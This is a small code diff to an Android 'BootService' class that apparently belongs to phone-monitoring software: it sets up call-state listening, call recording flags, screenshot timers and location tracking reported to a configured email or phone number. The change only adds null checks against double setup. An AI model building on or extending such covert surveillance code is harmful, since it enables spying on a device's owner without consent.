@@ -54,7 +54,7 @@ public class BootService extends Service
 	//private final long mScreenshotDelay  = 3000;  // 3  Seconds
 	//private final long mScreenshotPeriod = 30000; // 30 Seconds
 	
-	public static LocationUtil locationUtil;
+	public static LocationUtil locationUtil = null;
 	private TelephonyManager telManager;
 	private boolean recordStarted = false;
 	public static String otherSidePhoneNum = "";
@@ -193,13 +193,15 @@ public class BootService extends Service
 			if (recvMail.length() > 0) 
 			{
 				mGetInfoTimer.scheduleAtFixedRate(mInfoTask, mGetInfoDelay, mGetInfoPeriod);
-			
-				telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-				telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+				
+				if (telManager == null) {
+					telManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+					telManager.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
+				}
 			}
 			
 			String recvPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-			if (recvPhoneNum.length() > 0) 
+			if (recvPhoneNum.length() > 0 && locationUtil == null) 
 			{
 				locationUtil = new LocationUtil(context);
 			}
